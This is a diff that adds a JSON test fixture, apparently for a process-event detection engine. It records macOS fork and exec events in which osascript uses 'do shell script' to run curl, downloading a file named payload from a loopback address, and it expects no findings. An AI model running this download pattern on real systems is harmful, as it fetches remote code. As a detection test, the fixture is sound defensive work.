@@ -1,0 +1,16 @@
+{
+  "events": [
+    {"event_id": "one-neg-osa-fork", "host_id": "fixture-host", "timestamp_ns": 1000000000, "event_type": "fork",
+     "payload": {"child_pid": 6101, "parent_pid": 1}},
+    {"event_id": "one-neg-osa-exec", "host_id": "fixture-host", "timestamp_ns": 1010000000, "event_type": "exec",
+     "payload": {"pid": 6101, "ppid": 1, "path": "/usr/bin/osascript",
+                 "args": ["osascript", "-e", "do shell script \"curl -o /tmp/payload http://127.0.0.1:9/x\""],
+                 "cwd": "/tmp", "uid": 501, "gid": 20}},
+    {"event_id": "one-neg-curl-fork", "host_id": "fixture-host", "timestamp_ns": 1050000000, "event_type": "fork",
+     "payload": {"child_pid": 6102, "parent_pid": 6101}},
+    {"event_id": "one-neg-curl-exec", "host_id": "fixture-host", "timestamp_ns": 1060000000, "event_type": "exec",
+     "payload": {"pid": 6102, "ppid": 6101, "path": "/usr/bin/curl",
+                 "args": ["curl", "-o", "/tmp/payload", "http://127.0.0.1:9/x"], "cwd": "/tmp", "uid": 501, "gid": 20}}
+  ],
+  "expected_findings": []
+}
